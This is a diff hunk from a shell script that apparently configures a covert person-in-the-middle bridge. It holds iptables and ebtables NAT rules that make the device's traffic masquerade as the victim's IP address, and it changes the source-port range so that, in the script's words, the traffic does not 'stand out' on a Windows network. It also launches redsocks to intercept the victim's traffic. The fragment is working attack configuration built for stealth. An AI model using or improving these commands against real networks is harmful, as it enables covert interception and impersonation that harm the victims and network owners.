@@ -132,13 +132,13 @@ iptables -t nat -I POSTROUTING -s ${br_dev_ip}  ! -d $victim_ip -j SNAT --to $vi
 
 # We special case TCP and UDP to be able to rewrite the source ports so as not to stand out
 # This range is suitable for a predominantly Windows network
-iptables -t nat -I POSTROUTING -p tcp -s ${br_dev_ip} ! -d $victim_ip -j SNAT --to $victim_ip:27000-32000
-iptables -t nat -I POSTROUTING -p udp -s ${br_dev_ip} ! -d $victim_ip -j SNAT --to $victim_ip:27000-32000
+iptables -t nat -I POSTROUTING -p tcp -s ${br_dev_ip} ! -d $victim_ip -j SNAT --to $victim_ip:49152-65535
+iptables -t nat -I POSTROUTING -p udp -s ${br_dev_ip} ! -d $victim_ip -j SNAT --to $victim_ip:49152-65535
 
 # ebtables -t nat -I POSTROUTING -s ${br_dev_mac}   -d $victim_mac -j snat --to-source $router_mac
 # iptables -t nat -I POSTROUTING -s ${br_dev_ip}    -d $victim_ip -j SNAT --to $router_ip
-# iptables -t nat -I POSTROUTING -p tcp -s ${br_dev_ip}   -d $victim_ip -j SNAT --to $router_ip:27000-32000
-# iptables -t nat -I POSTROUTING -p udp -s ${br_dev_ip}   -d $victim_ip -j SNAT --to $router_ip:27000-32000
+# iptables -t nat -I POSTROUTING -p tcp -s ${br_dev_ip}   -d $victim_ip -j SNAT --to $router_ip:49152-65535
+# iptables -t nat -I POSTROUTING -p udp -s ${br_dev_ip}   -d $victim_ip -j SNAT --to $router_ip:49152-65535
 
 # redsocks is useful for intercepting traffic going to or from the victim
 screen -S pitm -X screen -t "redsocks" redsocks -c /etc/redsocks.conf
